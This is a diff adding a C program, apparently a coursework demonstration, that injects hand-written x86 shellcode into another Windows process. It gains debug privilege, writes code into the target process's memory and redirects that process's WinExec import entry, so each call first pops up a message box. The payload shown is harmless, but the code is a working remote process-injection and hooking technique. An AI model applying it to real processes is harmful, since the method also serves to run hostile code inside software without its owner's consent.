@@ -1,0 +1,214 @@
+
+
+#include <stdio.h>
+#include <windows.h>
+
+
+
+int EnableDebugPriv(const char* name)
+{
+    HANDLE hToken;        //进程令牌句柄
+    TOKEN_PRIVILEGES tp;  //TOKEN_PRIVILEGES结构体，其中包含一个【类型+操作】的权限数组
+    LUID luid;            //上述结构体中的类型值
+
+    //打开进程令牌环
+    //GetCurrentProcess()获取当前进程的伪句柄，只会指向当前进程或者线程句柄，随时变化
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+    {
+        fprintf(stderr, "OpenProcessToken error\n");
+        return -1;
+    }
+
+    //获得本地进程name所代表的权限类型的局部唯一ID
+    if (!LookupPrivilegeValue(NULL, name, &luid))
+    {
+        fprintf(stderr, "LookupPrivilegeValue error\n");
+    }
+
+    tp.PrivilegeCount = 1;                               //权限数组中只有一个“元素”
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  //权限操作
+    tp.Privileges[0].Luid = luid;                        //权限类型
+
+    //调整进程权限
+    if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+    {
+        fprintf(stderr, "AdjustTokenPrivileges error!\n");
+        return -1;
+    }
+
+    return 0;
+
+}
+
+int main()
+{
+    char addr[5] = { 0 };            //保存四字节地址信息
+
+    HANDLE hProcess;               //进程句柄
+    DWORD dwHasWrite;              //实际读取的字节数
+    LPVOID lpRemoteBuf;            //新申请的内存空间指针
+
+    int temp = 0;                  //临时变量
+    int pid = 0;                   //需要Hook的进程PID
+
+    //数据
+    char data[] = "\x74\x65\x73\x74\x00\xCC\xCC\xCC"
+        "\xD7\xE9\xB3\xA4\x20\x3A\x20\xBA"
+        "\xCE\xC4\xDC\xB1\xF3\x20\x32\x30"
+        "\x31\x33\x33\x30\x32\x35\x33\x30"
+        "\x30\x32\x30\x0A\xD7\xE9\xD4\xB1"
+        "\x20\x3A\x20\xCD\xF5\x20\x20\xEC"
+        "\xB3\x20\x32\x30\x31\x33\x33\x30"
+        "\x32\x35\x33\x30\x30\x30\x35\x0A"
+        "\x20\x20\x20\x20\x20\x20\x20\xB5"
+        "\xCB\xB9\xE3\xF6\xCE\x20\x32\x30"
+        "\x31\x33\x33\x30\x32\x35\x33\x30"
+        "\x30\x31\x34\x0A\x20\x20\x20\x20"
+        "\x20\x20\x20\xB9\xA8\xD3\xF1\xB7"
+        "\xEF\x20\x32\x30\x31\x33\x33\x30"
+        "\x32\x35\x33\x30\x30\x32\x31\x00";
+
+    //shellcode
+    //pushfd
+    //push eax
+    //push ecx
+    //push edx
+    //push ebx
+    //push ebp
+    //push esi
+    //push edi
+    //push 0
+    //push offset ptr "test"
+    //push offset ptr "内容"
+    //push 0
+    //mov eax,user32.MessageBox
+    //call eax
+    //pop edi
+    //pop esi
+    //pop ebp
+    //pop ebx
+    //pop edx
+    //pop ecx
+    //pop eax
+    //popfd
+    //mov eax,kernel32.WinExec
+    //jmp eax
+    char shellcode[] =
+        "\x9C\x50\x51\x52\x53\x55\x56\x57"
+        "\x6A\x00\x68\x00\x10\x40\x00\x68"
+        "\x00\x10\x40\x00\x6A\x00\xB8\xEA"
+        "\x07\xD5\x77\xFF\xD0\x5F\x5E\x5D"
+        "\x5B\x5A\x59\x58\x9D\xB8\xEA\x07"
+        "\xD5\x7C\xFF\xE0";
+
+    if (EnableDebugPriv(SE_DEBUG_NAME))   //获取调试权限
+    {
+        fprintf(stderr, "Add Privilege error\n");
+
+        return -1;
+    }
+
+    printf("请输入需要Hook的进程PID :");
+    scanf("%d", &pid);                   //输入需要hook的函数的程序PID
+
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); //获取进程句柄
+    if (hProcess == NULL)
+    {
+        fprintf(stderr, "\n获取进程句柄错误%d", GetLastError());
+        return -1;
+    }
+
+    //申请120字节的数据空间,并写入我们需要的数据
+    lpRemoteBuf = VirtualAllocEx(hProcess, NULL, 120, MEM_COMMIT, PAGE_READWRITE);
+    if (WriteProcessMemory(hProcess, lpRemoteBuf, data, 120, &dwHasWrite))
+    {
+        if (dwHasWrite != 120)
+        {
+            VirtualFreeEx(hProcess, lpRemoteBuf, 120, MEM_COMMIT);
+            CloseHandle(hProcess);
+            return -1;
+        }
+
+    }
+    else
+    {
+        printf("\n写入远程进程内存空间出错%d。", GetLastError());
+        CloseHandle(hProcess);
+        return -1;
+    }
+
+    temp = (int)lpRemoteBuf;   //数据所在首地址
+    addr[0] = temp & 0xff;
+    addr[1] = temp >> 8 & 0xff;
+    addr[2] = temp >> 16 & 0xff;
+    addr[3] = temp >> 24 & 0xff;
+
+    shellcode[11] = addr[0];  //"test" 的地址
+    shellcode[12] = addr[1];
+    shellcode[13] = addr[2];
+    shellcode[14] = addr[3];
+
+    shellcode[16] = addr[0] + 8;//"所要显示的字符串首地址"
+    shellcode[17] = addr[1];
+    shellcode[18] = addr[2];
+    shellcode[19] = addr[3];
+
+    temp = MessageBoxA;      //MessageBoxA的地址
+    addr[0] = temp & 0xff;
+    addr[1] = temp >> 8 & 0xff;
+    addr[2] = temp >> 16 & 0xff;
+    addr[3] = temp >> 24 & 0xff;
+    shellcode[23] = addr[0];
+    shellcode[24] = addr[1];
+    shellcode[25] = addr[2];
+    shellcode[26] = addr[3];
+
+    temp = WinExec;         //原函数的地址,用于jmp回原来的函数,我的程序只Hook了WinExec,可以做相应的调整
+    addr[0] = temp & 0xff;
+    addr[1] = temp >> 8 & 0xff;
+    addr[2] = temp >> 16 & 0xff;
+    addr[3] = temp >> 24 & 0xff;
+    shellcode[38] = addr[0];
+    shellcode[39] = addr[1];
+    shellcode[40] = addr[2];
+    shellcode[41] = addr[3];
+
+    //申请44字节的可读可写可执行的shellcode空间,并写入shellcode
+    lpRemoteBuf = VirtualAllocEx(hProcess, NULL, 44, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (WriteProcessMemory(hProcess, lpRemoteBuf, shellcode, 44, &dwHasWrite))
+    {
+        if (dwHasWrite != 44)
+        {
+            VirtualFreeEx(hProcess, lpRemoteBuf, 44, MEM_COMMIT);
+            CloseHandle(hProcess);
+            return -1;
+        }
+
+    }
+    else
+    {
+        printf("\n写入远程进程内存空间出错%d。", GetLastError());
+        CloseHandle(hProcess);
+        return -1;
+    }
+
+    temp = (int)lpRemoteBuf;  //获取shellcode的首地址,并替换IAT表中相应的函数地址
+    addr[0] = temp & 0xff;
+    addr[1] = temp >> 8 & 0xff;
+    addr[2] = temp >> 16 & 0xff;
+    addr[3] = temp >> 24 & 0xff;
+    //0x42f1b8这个地址是远程进程保存WinExec的地址内存块的地址
+    //地址可以通过我上传的完整版内存注入程序获取
+    if (WriteProcessMemory(hProcess, 0x42f1b8, addr, 4, &dwHasWrite))
+    {
+        printf("注入成功!!\n");
+        return 0;
+    }
+    else
+    {
+        printf("\n写入远程进程内存空间出错%d。", GetLastError());
+    }
+
+    CloseHandle(hProcess);
+    return -1;
+}
